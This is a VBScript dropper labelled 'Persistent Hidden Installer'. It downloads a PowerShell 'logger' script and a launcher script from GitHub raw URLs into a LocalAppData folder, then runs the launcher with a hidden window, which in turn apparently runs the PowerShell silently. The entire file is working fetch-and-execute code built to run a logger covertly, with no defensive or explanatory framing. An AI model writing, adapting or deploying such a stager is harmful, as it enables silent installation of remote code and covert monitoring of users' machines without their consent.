' deploy_appdata.vbs - Persistent Hidden Installer
Option Explicit

Dim objShell, objFSO, objHTTP, strAppData, strTargetFolder
Dim arrFiles, file, strFileURL, strHDLocation

' Configuration: GitHub Raw URLs
' Ensure these point to the EXACT raw links of your files
arrFiles = Array( _
    Array("safe_logger.ps1", "https://raw.githubusercontent.com/tasqlab/scriptees/main/logger/v2/safe_logger.ps1"), _
    Array("start_hidden_logger.vbs", "https://raw.githubusercontent.com/tasqlab/scriptees/main/logger/v2/start_hidden_logger.vbs") _
)

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get AppData Local Path
strAppData = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
strTargetFolder = strAppData & "\Scriptees\LoggerV2"

' Create directory if it doesn't exist
If Not objFSO.FolderExists(strTargetFolder) Then
    objFSO.CreateFolder(strTargetFolder)
End If

' Loop through files, download, and execute
For Each file In arrFiles
    strFileURL = file(1)
    strHDLocation = strTargetFolder & "\" & file(0)
    
    If DownloadFile(strFileURL, strHDLocation) Then
        ' If it's the VBS launcher, run it!
        If LCase(file(0)) = "start_hidden_logger.vbs" Then
            ' Run the VBS which handles the hidden PowerShell execution
            objShell.Run """" & strHDLocation & """", 0, False
        End If
    End If
Next

Set objShell = Nothing
Set objFSO = Nothing

Function DownloadFile(myURL, myPath)
    Dim objHTTP, objFile
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    
    On Error Resume Next
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    
    If Err.Number = 0 And objHTTP.Status = 200 Then
        Set objFile = objFSO.CreateTextFile(myPath, True)
        objFile.Write objHTTP.ResponseText
        objFile.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
    On Error Goto 0
    
    Set objHTTP = Nothing
End Function